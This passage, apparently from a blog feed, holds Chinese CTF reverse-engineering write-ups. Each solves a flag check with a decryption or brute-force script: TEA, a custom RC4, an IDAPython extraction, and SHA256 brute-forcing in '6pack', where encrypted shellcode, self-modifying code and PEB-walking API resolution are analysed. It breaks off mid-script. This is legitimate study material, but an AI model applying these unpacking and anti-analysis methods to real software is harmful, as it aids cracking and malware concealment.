id="cooki"><a href="#cooki" class="headerlink" title="cooki"></a>cooki</h2><p>有花指令，看汇编，在爆红的地方按d，这个E1是垃圾指令，nop就行，后续有好几处e1，都直接nop掉之后再选中主函数进行编译就能得到主加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161740863.png" alt="img"></p><p>加密函数就是一个tea加密</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161740854.png" alt="img"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><br>a2 = [<span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>]<br>step = <span class="hljs-number">0x768CAB2E</span><br>v7 = [<br>    <span class="hljs-number">0x569A1C45</span>, <span class="hljs-number">0xEF2C6A10</span>,<br>    <span class="hljs-number">0xFB440BD6</span>, <span class="hljs-number">0x5797F41D</span>,<br>    <span class="hljs-number">0x523FF2C3</span>, <span class="hljs-number">0x48337CD9</span>,<br>    <span class="hljs-number">0x3616AC2D</span>, <span class="hljs-number">0x06B6312D</span><br>]<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_block</span>(<span class="hljs-params">v4_enc, v5_enc</span>):<br>    v4 = v4_enc<br>    v5 = v5_enc<br><br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        current_step = <span class="hljs-number">32</span> - k<br>        v6 = (-step * current_step) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        term1 = v6<br>        term2 = (v4 + v6) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term3 = (<span class="hljs-number">16</span> * v4 + a2[<span class="hljs-number">2</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term4 = ((v4 &gt;&gt; <span class="hljs-number">5</span>) + a2[<span class="hljs-number">3</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        delta2 = (term1 ^ term2 ^ term3 ^ term4) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v5_old = (v5 - delta2) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        term1_d1 = v6<br>        term2_d1 = (v5_old + v6) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term3_d1 = (<span class="hljs-number">16</span> * v5_old + a2[<span class="hljs-number">0</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        term4_d1 = ((v5_old &gt;&gt; <span class="hljs-number">5</span>) + a2[<span class="hljs-number">1</span>]) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        delta1 = (term1_d1 ^ term2_d1 ^ term3_d1 ^ term4_d1) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v4_old = (v4 - delta1) &amp; <span class="hljs-number">0xFFFFFFFF</span><br><br>        v4, v5 = v4_old, v5_old<br>    <span class="hljs-keyword">return</span> v4, v5<br><br><br>flag_bytes = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    v4_enc = v7[<span class="hljs-number">2</span> * i]<br>    v5_enc = v7[<span class="hljs-number">2</span> * i + <span class="hljs-number">1</span>]<br>    v4_orig, v5_orig = decrypt_block(v4_enc, v5_enc)<br>    flag_bytes += struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, v4_orig) + struct.pack(<span class="hljs-string">&quot;&lt;I&quot;</span>, v5_orig)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag_bytes.decode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;解密字节:&quot;</span>, flag_bytes.<span class="hljs-built_in">hex</span>())<br></code></pre></td></tr></table></figure><p>flag{b3d06a66f8aa86e3e6390f615e389e55}</p><h2 id="EasyRE"><a href="#EasyRE" class="headerlink" title="EasyRE"></a>EasyRE</h2><p>这题没管反调试，可以直接看加密逻辑，自定义的rc4加密算法，最后与密文比较</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508161749716.png" alt="img"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">ror3</span>(<span class="hljs-params">x, n</span>):<br>    <span class="hljs-keyword">return</span> ((x &gt;&gt; n) | (x &lt;&lt; (<span class="hljs-number">8</span> - n))) &amp; <span class="hljs-number">0xFF</span><br><br>target = [<br>    <span class="hljs-number">0x93</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xD8</span>,<br>    <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x57</span><br>]<br><br>T = []<br>prev = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> target:<br>    t = (x ^ prev) ^ <span class="hljs-number">0x42</span><br>    T.append(t)<br>    prev = x<br><br><span class="hljs-comment"># Step 2: Simulate KSA</span><br>S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>j = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>    j = (j + S[i] - <span class="hljs-number">7</span> * (i // <span class="hljs-number">7</span>) + i + <span class="hljs-number">4919</span>) % <span class="hljs-number">256</span><br>    S[i], S[j] = S[j], S[i]<br><br><span class="hljs-comment"># Step 3: PRGA - collect r and k for 29 bytes</span><br>i = <span class="hljs-number">0</span><br>j = <span class="hljs-number">0</span><br>ks = []<br>rs = []<br><br><span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">if</span> i % <span class="hljs-number">3</span> == <span class="hljs-number">0</span>:<br>        j = (j + S[<span class="hljs-number">3</span> * i % <span class="hljs-number">256</span>]) % <span class="hljs-number">256</span><br>    <span class="hljs-keyword">else</span>:<br>        j = (j + S[i]) % <span class="hljs-number">256</span><br><br>    old_si = S[i]<br>    old_sj = S[j]<br>    S[i], S[j] = S[j], S[i]  <span class="hljs-comment"># swap</span><br><br>    r = (i * j) % <span class="hljs-number">16</span><br>    k = S[(old_si + old_sj) % <span class="hljs-number">256</span>]  <span class="hljs-comment"># 修正：k = S[old_S[i] + old_S[j]]</span><br><br>    rs.append(r)<br>    ks.append(k)<br><br><span class="hljs-comment"># Step 4: Recover input</span><br>flag = []<br><span class="hljs-keyword">for</span> idx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">29</span>):<br>    t_val = T[idx]<br>    r_val = rs[idx]<br>    k_val = ks[idx]<br><br>    x = ror3(t_val, <span class="hljs-number">3</span>)  <span class="hljs-comment"># undo ROL3</span><br>    input_byte = (x - r_val) &amp; <span class="hljs-number">0xFF</span><br>    input_byte ^= k_val<br><br>    flag.append(input_byte)<br><br>flag_str = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(b) <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> flag)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag_str)<br></code></pre></td></tr></table></figure><p>Flag: flag{Th1s_1s_A_Fl4w3d_Crypt0}</p>]]></content>
    
    
    <categories>
      
      <category>reverse比赛复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-reverse-wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Justctf2025</title>
    <link href="/2025/08/13/Justctf2025/"/>
    <url>/2025/08/13/Justctf2025/</url>
    
    <content type="html"><![CDATA[<h2 id="Satellite"><a href="#Satellite" class="headerlink" title="Satellite"></a>Satellite</h2><p>一道misc+re的题</p><p>给了一个流量包，直接wireshark分析，这一行非常清楚的flag字样，点击看到了text，猜测是密文</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508031234442.png" alt="image-20250803123354221"></p><p>{“text”:  “5771D410  CFFE844D<br>24B50FCB  BBDC1973<br>A7A935E5  C3468242<br>950DFCCE  94794B06<br>7F876A21  5D96EE09”}</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508031241616.png" alt="image-20250803124120526"></p><p>可以通过查找字符串，找到相关语句，然后交叉引用找到主函数，这里就是找到的加密函数位置，是一个tea加密，没啥变化，可以直接写脚本解密</p><p>注意key的提取，从dword_14B98[98]开始取，一共四位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> c_uint32<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tea_decrypt</span>(<span class="hljs-params">v, key, delta, rounds=<span class="hljs-number">32</span></span>):<br>    v0 = c_uint32(v[<span class="hljs-number">0</span>])<br>    v1 = c_uint32(v[<span class="hljs-number">1</span>])<br>    <span class="hljs-built_in">sum</span> = c_uint32(<span class="hljs-number">0xC6EF3720</span>)<br><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rounds):<br>        v1.value -= ((v0.value &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">2</span>]) ^ (v0.value + <span class="hljs-built_in">sum</span>.value) ^ ((v0.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">3</span>])<br>        v0.value -= ((v1.value &lt;&lt; <span class="hljs-number">4</span>) + key[<span class="hljs-number">0</span>]) ^ (v1.value + <span class="hljs-built_in">sum</span>.value) ^ ((v1.value &gt;&gt; <span class="hljs-number">5</span>) + key[<span class="hljs-number">1</span>])<br>        <span class="hljs-built_in">sum</span>.value += delta<br><br>    <span class="hljs-keyword">return</span> v0.value, v1.value<br><br>key = [<span class="hljs-number">0x12345678</span>, <span class="hljs-number">0x9ABCDEF0</span>, <span class="hljs-number">0x11111111</span>, <span class="hljs-number">0x22222222</span>]<br><br>cipher_hex = <span class="hljs-string">&quot;5771D410CFFE844D24B50FCBBBDC1973A7A935E5C3468242950DFCCE94794B067F876A215D96EE09&quot;</span><br>cipher_bytes = <span class="hljs-built_in">bytes</span>.fromhex(cipher_hex)<br><br>cipher_blocks = [<span class="hljs-built_in">int</span>.from_bytes(cipher_bytes[i:i + <span class="hljs-number">4</span>], byteorder=<span class="hljs-string">&quot;little&quot;</span>) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher_bytes), <span class="hljs-number">4</span>)]<br><br>delta = <span class="hljs-number">0x61C88647</span><br><br>plaintext = <span class="hljs-string">b&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(cipher_blocks), <span class="hljs-number">2</span>):<br>    dec_v0, dec_v1 = tea_decrypt(cipher_blocks[i:i + <span class="hljs-number">2</span>], key, delta)<br>    plaintext += dec_v0.to_bytes(<span class="hljs-number">4</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>) + dec_v1.to_bytes(<span class="hljs-number">4</span>, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>)<br><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] UTF-8 Decode (fallback with replacement):&quot;</span>)<br>    <span class="hljs-built_in">print</span>(plaintext.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;replace&#x27;</span>))<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[!] UTF-8 decode failed.&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>justCTF{TheConnection_w4s_interrupted}</p><h2 id="baby-goes-re"><a href="#baby-goes-re" class="headerlink" title="baby-goes-re"></a>baby-goes-re</h2><p>一个go语言程序，先来简单了解一下</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508041821100.png" alt="image-20250804182142963"></p><p>接口调用方式（<code>itab</code>, <code>rtype</code>, <code>interface&#123;&#125;</code>）</p><p>标准库调用（<code>fmt.Fprintln</code>, <code>fmt.Fprint</code>, <code>fmt.Fscanln</code>）</p><p>调用 <code>main_CheckFlag</code>-加密函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508041825813.png" alt="image-20250804182508726"></p><p>主函数就是从这个大数据模块：从 <code>aSmallMapWithNo + 3605</code> 开始，共 338660 字节，然后调用main_CheckFlag函数</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508041827021.png" alt="image-20250804182735934"></p><p>加密过程简单的来说就是</p><p>flag 的第 k 个字符必须等于    babymemory[51*k + 4919]</p><p>flag的字符长度为53，k从0-52，即babymemory 起始地址：0x4CA8C0 + 3605 &#x3D; 0x4CB5F5</p><p>为了方便直接用idapython，也可以把aSmallMapWithNo内容dump出来然后解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> idc<br><span class="hljs-keyword">import</span> idautils<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_flag</span>():<br>    base_addr = <span class="hljs-number">0x4CA8C0</span><br>    offset = <span class="hljs-number">3605</span><br>    positions = []<br>    current = <span class="hljs-number">4919</span> <br>    positions.append(current)<br>    <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">53</span>):<br>        current += <span class="hljs-number">4971</span> + <span class="hljs-number">51</span> * (i - <span class="hljs-number">1</span>)<br>        positions.append(current)<br><br>    flag = []<br>    <span class="hljs-keyword">for</span> pos <span class="hljs-keyword">in</span> positions:<br>        addr = base_addr + offset + pos<br>        byte_val = idc.get_wide_byte(addr)<br><br>        flag_char = <span class="hljs-built_in">chr</span>(byte_val)<br>        flag.append(flag_char)<br><br>    full_flag = <span class="hljs-string">&#x27;&#x27;</span>.join(flag)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nflag:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(full_flag)<br>    <br>    <span class="hljs-keyword">return</span> full_flag<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    extract_flag()<br><br><br></code></pre></td></tr></table></figure><p>justCTF{W3lc0m3_t0_R3v1NG!_Th4t_w45nt-s0-B4d-w45_1t?}</p><h2 id="6pack"><a href="#6pack" class="headerlink" title="6pack"></a>6pack</h2><p>依旧是misc+re的题</p><p>先看go语言程序，找到main函数位置</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051554682.png" alt="image-20250805155417483"></p><p>接着分析调用的一些函数</p><p>sub_4C8820函数用于创建ipv6 header</p><p>sub_4CA0E0函数发送数据包</p><p>sub_4CABA0函数使用flate&#x2F;zlib解压并读取所有数据，从这里就可以推测要分析的代码应该就在给的流量包里面</p><p>流量包分析提取数据只能交给misc师傅来提取了，过程也是很艰辛的，最后得到了一个exe文件</p><hr><p>得到的exe文件有一层upx壳，一键脱壳就行</p><ol><li><p>主函数的逻辑就是，先输入一个参数，要求在30720-32767之间，这里得要爆破，如果传入的参数不对，后续通过动调得到的代码就不对，这里的v12是密钥，密钥判断</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051637068.png"></p></li><li><p>sub_7FF65E8E2730函数的作用是读取给的6-pack文件，找到.go.runtimeinfo节，然后读取加密的shellcode</p><p>注意放在同一个文件夹下，动调的时候要用到，不然动调不起来。</p></li><li><p>sub_7FF65E8E26E0函数，使用 SystemFunction033 解密 shellcode，这里就涉及到第二个参数，其实就是flag。这里真实的逻辑是一个smc，动调的时候能够解密得到可执行代码</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508052318147.png" alt="image-20250805231818999"></p><p>这里经过动调之后把SystemFunction033的字节按c&#x2F;p可以识别成函数，这里有一个长度判断，就是第二个参数（flag的长度，我们要把传入的参数改为36</p></li></ol><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051753913.png" alt="image-20250805175319812"></p><p>这里就是一个很明显的smc，动调过之后把byte_1B8CCB50100字节进行反编译就能得到我们要分析的代码</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508051753888.png" alt="image-20250805175338800"></p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508052326869.png" alt="image-20250805232641737"></p><p>主要代码：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c#">_BOOL8 __<span class="hljs-function">fastcall <span class="hljs-title">sub_1A3CCFA0100</span>(<span class="hljs-params">__int64 a1, unsigned __int64 a2</span>)</span><br>&#123;<br>  <span class="hljs-keyword">void</span> (__fastcall *v2)(<span class="hljs-built_in">char</span> *); <span class="hljs-comment">// rax</span><br>  __int64 v3; <span class="hljs-comment">// rcx</span><br>  __int64 v4; <span class="hljs-comment">// rax</span><br>  __int64 n12; <span class="hljs-comment">// [rsp+28h] [rbp-48h]</span><br>  _QWORD v7[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+30h] [rbp-40h] BYREF</span><br>  unsigned __int64 v8; <span class="hljs-comment">// [rsp+50h] [rbp-20h]</span><br>  __int64 v9; <span class="hljs-comment">// [rsp+58h] [rbp-18h]</span><br>  unsigned __int64 v10; <span class="hljs-comment">// [rsp+60h] [rbp-10h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+68h] [rbp-8h]</span><br><br>  v11 = a1;<br>  v10 = a2;<br>  v9 = <span class="hljs-number">0L</span>L;<br>  v8 = <span class="hljs-number">0L</span>L;<br>  memset(v7, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(v7));<br>  n12 = <span class="hljs-number">0L</span>L;<br>  v2 = sub_1A3CCFA01F8(NtCurrentPeb()-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink-&gt;Flink-&gt;Flink[<span class="hljs-number">2</span>].Flink, dword_1A3CCFA0253);<br>  v2(aBcryptDll);                               <span class="hljs-comment">// &quot;bcrypt.dll&quot;</span><br>  v8 = v10 / <span class="hljs-number">3</span>;<br>  <span class="hljs-keyword">do</span><br>  &#123;<br>    v3 = v11;<br>    v11 += <span class="hljs-number">3L</span>L;<br>    ((&amp;loc_1A3CCFA026D + <span class="hljs-number">2</span>))(v3, v7);<br>    v4 = v9;<br>    LOBYTE(v4) = memcmp(&amp;loc_1A3CCFA03CF + <span class="hljs-number">8</span> * v9 + <span class="hljs-number">1</span>, v7, <span class="hljs-number">0x20</span>uLL) == <span class="hljs-number">0</span>;<br>    n12 += v4;<br>    v9 += <span class="hljs-number">4L</span>L;<br>    --v8;<br>  &#125;<br>  <span class="hljs-keyword">while</span> ( v8 );<br>  <span class="hljs-keyword">return</span> n12 != <span class="hljs-number">12</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的加密函数（loc_2320BE5026D + 2），这个是没有自动识别的函数，自己手动编译一下，这是主要的加密内容，这个函数对 3 字节输入计算 SHA256 哈希，输出 32 字节</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508052329102.png" alt="image-20250805232946969"></p><p>哈希值就是unk_1B8CCB503D0[384]内容，一共12个正确的哈希值</p><p>爆破脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br>hashes = [<br>    <span class="hljs-comment"># 1</span><br>    <span class="hljs-number">0x20</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0x35</span>,<br>    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x16</span>,<br>    <span class="hljs-comment"># 2</span><br>    <span class="hljs-number">0x73</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x30</span>,<br>    <span class="hljs-comment"># 3</span><br>    <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x1B</span>, 